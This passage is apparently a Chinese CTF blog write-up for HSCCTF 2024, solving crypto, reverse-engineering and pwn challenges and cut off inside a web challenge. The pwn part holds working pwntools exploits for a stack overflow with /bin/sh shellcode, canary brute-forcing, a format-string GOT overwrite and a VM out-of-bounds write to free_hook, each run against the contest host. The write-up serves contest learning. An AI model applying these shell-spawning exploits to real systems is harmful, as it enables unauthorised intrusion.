class="number">768905250861905487717845092484035532140840941871031779930259407348955511757335716790249355464829607714399266689960353955065504221985891074636544161678177920296971444880997864168042745264256952808480926755620637239135808617643874771066244234690401223758004286234917537720362007827248701308605961814972773704288547887039586934111562590676930853945316673164146667949991176600280451163710564978897622310650541491271961315592017251211248379608602287809736613530069187936569470129814949302440734244885473716072898519354127964155042421376782226235081303957997587618278341829891036314980185040102049478608445519994654780162</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">x,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x-<span class="number">1</span>)//n</span><br><span class="line"></span><br><span class="line">lamb = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">miu = inverse_mod(lamb,n)</span><br><span class="line">m = (L(<span class="built_in">pow</span>(c,lamb,n**<span class="number">2</span>),n)*miu)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;this_is_a_fake_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>用密码 <code>HSCCTF&#123;this_is_a_fake_flag&#125;</code> 解压得到 key.png。</p><p>再看 task.py，<code>f()</code> 函数不完整，根据提示是一种填充图片的算法，必定遍历0~65535共65536个下标值。</p><p>结合 <code>m = 1 &lt;&lt; (n - 1)</code> 和传入的 $n=128=\frac{256}{2}$，猜测为使用Hilbert曲线遍历 $256 \times 256$ 个值。</p><p>找到<a href="https://github.com/LynchrocketCourseLearning/2022Spring-CS208-Algorithm_Design_and_Analysis/blob/c9c992501063af9c7849c6eb95274964b719a0a1/lab/8/HilbertCurve.java">Hilbert曲线递归遍历的代码</a>，补充 <code>f()</code> 函数，还原flag.jpg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n, x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> x &lt;= m:</span><br><span class="line">        <span class="keyword">if</span> y &lt;= m:</span><br><span class="line">            <span class="keyword">return</span> f(n - <span class="number">1</span>, y, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> m * m + f(n - <span class="number">1</span>, x, y - m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y &gt; m:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * m * m + f(n - <span class="number">1</span>, x - m, y - m)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span> * m * m + f(n - <span class="number">1</span>, m + <span class="number">1</span> - y, m + <span class="number">1</span> - (x - m))</span><br><span class="line">        </span><br><span class="line">j = <span class="number">128</span></span><br><span class="line">mm = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">257</span>):</span><br><span class="line">        mm.append(f(j, i, s) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;enc.jpg&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">c = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;key.png&#x27;</span>)</span><br><span class="line">pixels = <span class="built_in">list</span>(img.getdata())</span><br><span class="line">png_key = [pixel <span class="keyword">for</span> pixel <span class="keyword">in</span> pixels]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    c[s] = c[s] ^ png_key[s]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">65536</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    flag[mm[i]] = c[i]</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&#x27;L&#x27;</span>, (<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line">image.putdata(flag)</span><br><span class="line">image.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到原始图片：</p><p><img src="/2024/03/11/match-HSCCTF-2024/flag.jpg" alt="flag"></p><p>flag：<code>HSCCTF&#123;oh!_you_c_yhhhh&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><blockquote><p>将得到的flag改为HSCCTF。</p></blockquote><p>简答TEA加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">check_index = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">check_enc = [<span class="number">0x05</span>,<span class="number">0xd7</span>,<span class="number">0xb8</span>,<span class="number">0x67</span>]</span><br><span class="line">c = [check_enc[check_index[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c0 = bytes_to_long(<span class="built_in">bytes</span>(c)[::-<span class="number">1</span>])</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="string">&#x27;3c471c36&#x27;</span>[::-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">d = decrypt([c0,c1], key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d[<span class="number">0</span>])[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(d[<span class="number">1</span>])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#688ed036-a86a60ce</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;688ed036-a86a60ce&#125;</code></p><p>​    </p><h3 id="ROULETTE"><a href="#ROULETTE" class="headerlink" title="ROULETTE"></a>ROULETTE</h3><blockquote><p>听说麻将连胜8局达到8本场就可以直接役满？！！<br>那么…这个游戏连胜8局难道会直接得到flag？！！！<br>（宫永照脸<br>flag形式同其他题目。</p></blockquote><p>patch <code>main_0()</code> 中的 <code>call sub_43E165</code> 为 <code>call sub_445990</code>，</p><p>再运行patch后的程序，直接输出结果 <code>HSCCTF&#123;H31L0_My_FR13ND!&#125;</code>。</p><p>​    </p><h3 id="THE-WOLF-SONG"><a href="#THE-WOLF-SONG" class="headerlink" title="THE_WOLF_SONG"></a>THE_WOLF_SONG</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}<br>听电子音乐，享赛博人生。</p></blockquote><p>patch main函数的输出。进入 <code>sub_1400440F0()</code>，识别为RC4算法。</p><p>照代码逻辑动调逆一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0xCE</span>, <span class="number">0x26</span>, <span class="number">0x9C</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xD9</span>, <span class="number">0xFD</span>, <span class="number">0x23</span>, <span class="number">0xBA</span>, <span class="number">0x9A</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xA8</span>, <span class="number">0x2E</span>, <span class="number">0xBD</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x5D</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xFD</span>, <span class="number">0xCD</span>, <span class="number">0x63</span>, <span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x94</span>, <span class="number">0x5B</span>, <span class="number">0x95</span>, <span class="number">0x2C</span>, </span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x60</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0xB4</span>, <span class="number">0x30</span>, <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0xEF</span>, <span class="number">0x68</span>]</span><br><span class="line">b890 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">b8a0 = [<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0xa</span>,<span class="number">0xf</span>,<span class="number">0x14</span>,<span class="number">0x19</span>,<span class="number">0x1e</span>,<span class="number">0</span>]</span><br><span class="line">k = <span class="string">b&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i+<span class="number">1</span>] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k)-<span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k) <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4</span></span><br><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    S[i] = i</span><br><span class="line">    Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    j = (j + S[i] + Key[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % N</span><br><span class="line">    j = (j + S[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">t = [k^b890[b8a0[<span class="number">1</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line">t = [k^b890[b8a0[<span class="number">0</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="NO-PY"><a href="#NO-PY" class="headerlink" title="NO_PY"></a>NO_PY</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example} 将得到的flag改为HSCCTF。</p></blockquote><p>参考 BeginCTF 2024 - ezpython。</p><p>pyinstxtractor解包程序，pycdc反编译pyc , 发现是个SM4加密，缺少 key 和 enc。</p><p>继续反编译 <code>PYZ-00.pyz_extracted/secret.pyc</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;Please_Do_not_py&#x27;</span></span><br><span class="line">enc = <span class="string">b&#x27;YJ+70VWYioYm3EhF6qdScVXBpCdPm+hCS/HP+Gj421RyxkZbwzni7o2zGG/Mis4Wr6sbXYr4ufnKwQk7vrG8yA==&#x27;</span></span><br></pre></td></tr></table></figure><p>直接用SM4解不出，再反编译看 <code>PYZ-00.pyz_extracted/gmssl/sm4.pyc</code> 对比，发现魔改点，对key做了异或操作：<code>key = (lambda .0: [ i ^ 102 for i in .0 ])(key)</code></p><p>将key异或102，再SM4解密得flag：<code>flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="STACK"><a href="#STACK" class="headerlink" title="STACK"></a>STACK</h3><p>栈溢出，<code>gift()</code> 函数只给了 <code>jmp rsp</code>，控制rsp即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">|          buf         |   rbp   |        ret        |            ... ...          |</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">| shellcode    +       padding   |   gadget(jmp rsp) | asm(sub rsp, 0x90;jmp rsp)  |</span><br><span class="line">------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>当ret的时候，rip被赋值，指向了当前的rsp所指向的值，即jmp rsp的gadget，同时rsp自减一个字；</p><p>当程序继续执行，jmp rsp时，执行流被劫持到栈上，具体地址为ret的后一个字；</p><p>继续执行我们布置好的指令：rsp自减，指向buf开头，即shellcode开头。rip自动后移，指向jmp rsp；</p><p>继续执行，控制流jmp到rsp所指，buf的开头区域，顺利执行shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">14028</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gift=<span class="number">0x40063B</span></span><br><span class="line">ret=<span class="number">0x40050e</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">sc=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">pl=sc.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(gift)+asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PWN01"><a href="#PWN01" class="headerlink" title="PWN01"></a>PWN01</h3><p>参考 <a href="https://blog.csdn.net/yld666/article/details/134840123">NJCTF 2017 - messager</a>， 在函数 <code>sub_400BE9()</code> 存在一个明显的栈溢出漏洞，由于程序fork出了子进程，子进程的崩溃不影响主进程，故可通过爆破方式突破canary保护，覆盖函数返回地址改为 <code>sub_400B8E()</code> 得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">            r.recv()</span><br><span class="line">            r.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="built_in">bytes</span>([x]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r.recv()</span><br><span class="line">                canary += <span class="built_in">bytes</span>([x])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                r.close()</span><br><span class="line">            <span class="built_in">print</span>(x,canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line">canary = get_canary()</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">target = <span class="number">0x400b8e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(target)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h3><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/113512748">BUUCTF - inndy_echo2</a>，PIE+64为fmt，利用fmt泄露canary和程序基址，再改printf的got地址为system_plt即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">13978</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%39$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%41$p&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">eval</span>(r.recvline())-<span class="number">74</span>-<span class="number">0x9b9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">system_plt=pie+<span class="number">0x790</span>                 </span><br><span class="line">printf_got=pie+elf.got.printf</span><br><span class="line"></span><br><span class="line">pl=fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="GHOST"><a href="#GHOST" class="headerlink" title="GHOST"></a>GHOST</h3><p>参考 <a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Pwn/Ez_op/wp.md">RoarCTF 2019 - Ez-op</a>，题目是一个功能简单的vm，共有push/pop/add/sub/mul/div/load/save 8种指令。</p><p>漏洞在于load和save没有对offset进行检查，导致vm stack越界访问和写入，而题目是静态编译，free_hook和system等地址都已知。</p><p>由于stack-&gt;data指向堆，所以需要先利用load将堆地址读入vm stack中，然后和bss上的free_hook进行sub操作，再进行div 4就可以获得堆地址和free_hook之间的偏移，将system地址写入之后，后面触发free(input)的地方就可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">11764</span>)</span><br><span class="line"></span><br><span class="line">push = <span class="number">0xAAAA</span></span><br><span class="line">pop  = <span class="number">0xBBBB</span></span><br><span class="line">add  = <span class="number">0xCCCC</span></span><br><span class="line">sub  = <span class="number">0xDDDD</span></span><br><span class="line">mul  = <span class="number">0xEEEE</span></span><br><span class="line">div  = <span class="number">0xFFFF</span></span><br><span class="line">load = <span class="number">0x1145</span></span><br><span class="line">save = <span class="number">0x1919</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8050940</span></span><br><span class="line">free_hook = <span class="number">0x80dc9F0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> d])</span><br><span class="line"></span><br><span class="line">heap_offset = (<span class="number">0x110</span>-<span class="number">8</span>) // <span class="number">4</span></span><br><span class="line">code = create([push,push,push,push,load,push,sub,div,save])</span><br><span class="line">data = create([<span class="string">&quot;/bin/sh&quot;</span>,system_addr,<span class="number">4</span>,heap_offset,free_hook])</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(data)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​        </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CHECKIN-2"><a href="#CHECKIN-2" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;php://filter/<span class="subst">$a</span>/resource=/dev/null&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>)===<span 